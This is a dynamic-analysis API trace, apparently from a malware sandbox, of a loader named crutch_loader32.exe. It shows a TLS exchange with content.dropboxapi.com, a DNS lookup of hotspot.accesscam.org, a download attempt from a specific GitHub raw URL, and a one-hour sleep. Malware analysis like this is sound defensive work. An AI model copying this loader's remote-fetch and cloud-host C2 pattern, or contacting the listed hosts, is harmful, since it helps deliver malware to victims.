+[RET] 0x748a1c98
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f244
+[RET] 0x748a1caa
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x1ac
+[PAR] char   *buf : 0x111c358
+[PAR] int    len  : 0xc95
+[RET] 0x748af80a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x2a6f328
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x2a6f310
+[RET] 0x748a1f43
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f328
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f42c
+[RET] 0x748a2031
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f530
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x1ad
+[PAR]  fd_set FAR*  readfds   : 0x2a6f3f8
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2f4
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f2d8
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f3f8
+[RET] 0x748a1c30
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f2f4
+[RET] 0x748a1c44
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x1ac
+[PAR] char   *buf   : 0x1117f50
+[PAR] int    len    : 0x4400
+[RET] 0x748aefb7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <DecryptMessage> in [SspiCli.dll] 
+[PAR] PCtxtHandle    phContext    : 0x10f40f0
+[PAR] PSecBufferDesc pMessage     : 0x2a6f558
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x2a6f564
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x205
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x1117f50
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] unsigned long  MessageSeqNo : 0x0
+[PAR] unsigned long* pfQOP        : 0x0
+[RET] 0x748b7229
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <DecryptMessage>
+[PAR] PSecBufferDesc pMessage     : 0x0
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x2a6f564
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x15
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x1117f50
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x1be
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x0000000001117F65
+[STR]                   -> "HTTP/1.1 404 Not Found\r\nDate: Fri, 28 Feb 2025 02:12:44 GMT\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 285\r"
+[STR]                      "\nContent-Type: text/html; charset=iso-8859-1\r\n\r\n<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<"
+[STR]                      "title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL was not found on this server.</p>\n"
+[STR]                      "<hr>\n<address>Apache/2.4.41 (Ubuntu) Server at content.dropboxapi.com Port 443</address>\n</body></html>\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x32
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x1118123
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ApplyControlToken> in [SspiCli.dll] 
+[PAR] PCtxtHandle    phContext : 0x10f40f0
+[PAR] PSecBufferDesc pInput    : 0x2a6f6e8
+[RET] 0x748b77f0
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitializeSecurityContextA> in [SspiCli.dll] 
+[PAR] PCredHandle    phCredential  : 0x10ece50
+[PAR] PCtxtHandle    phContext     : 0x10f40f0
+[PAR] CHAR*          pszTargetName : 0x10c9218
+[STR]                -> "content.dropboxapi.com"
+[PAR] unsigned long  fContextReq   : 0x811c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x0 (SECURITY_NETWORK_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x10f40f0
+[PAR] PSecBufferDesc pOutput       : 0x2a6f6f4
+[PAR] unsigned long* pfContextAttr : 0x10c9000
+[PAR] PTimeStamp     ptsExpiry     : 0x10f40f8
+[RET] 0x748b786b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x1ac
+[PAR] char   *buf : 0x10e3af8
+[PAR] int    len  : 0x55
+[RET] 0x748af80a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeContextBuffer> in [SspiCli.dll] 
+[PAR] PVOID pvContextBuffer : 0x10e3af8
+[RET] 0x748b78ab
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <DeleteSecurityContext> in [SspiCli.dll] 
+[PAR] PCtxtHandle phContext : 0x10f40f0
+[RET] 0x748b7902
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <closesocket> in [WS2_32.dll] 
+[PAR] SOCKET       s : 0x1ac
+[RET] 0x748b2480
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeCredentialsHandle> in [SspiCli.dll] 
+[RET] 0x748b7716
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeLibrary> in [KERNEL32.DLL] 
+[RET] 0x748a15e0
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WSACleanup> in [WS2_32.dll] 
+[RET] 0x748a1229
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <DnsQuery_W> in [DNSAPI.dll] 
+[PAR] PCWSTR       pszName        : 0x10ad188
+[STR]              -> "hotspot.accesscam.org"
+[PAR] WORD         wType          : 0xd
+[PAR] DWORD        Options        : 0x0
+[PAR] PVOID        pExtra         : 0x0
+[PAR] PDNS_RECORD* ppQueryResults : 0x2a6f7a8
+[PAR] PVOID*       pReserved      : 0x2a6f7a8
+[RET] 0x748e4484
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InternetOpenA> in [WININET.dll] 
+[PAR] LPCTSTR lpszAgent       : 0x0 (null)
+[PAR] DWORD   dwAccessType    : 0x0 (INTERNET_OPEN_TYPE_PRECONFIG)
+[PAR] LPCTSTR lpszProxyName   : 0x0 (null)
+[PAR] LPCTSTR lpszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0 
+[RET] 0x748e42a7
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0x9e4]
+
+[ * ] [pid 0xa5c][tid 0x9e4] c:\users\user\desktop\crutch\crutch_loader32.exe
+[ i ] [ Thread is from a Worker Pool ]
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InternetOpenUrlA> in [WININET.dll] 
+[PAR] HINTERNET hInternet       : 0xcc0004
+[PAR] LPCTSTR   lpszUrl         : 0x10b11b0
+[STR]           -> "https://raw.githubusercontent.com/ksRD18pro/ksRD18/master/ntk.tmp"
+[PAR] LPCTSTR   lpszHeaders     : 0x0 (null)
+[PAR] DWORD     dwHeadersLength : 0x0
+[PAR] DWORD     dwFlags         : 0x1 (INTERNET_FLAG_TRANSFER_ASCII)
+[RET] 0x748e42c7
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0x91c]
+
+[ * ] [pid 0xa5c][tid 0x91c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[ i ] [ Thread is from a Worker Pool ]
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0xb80]
+
+[ * ] [pid 0xa5c][tid 0xb80] c:\users\user\desktop\crutch\crutch_loader32.exe
+[ i ] [ Thread is from a Worker Pool ]
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x36ee80 (3600 sec)
+[RET] 0x748e42e4
+
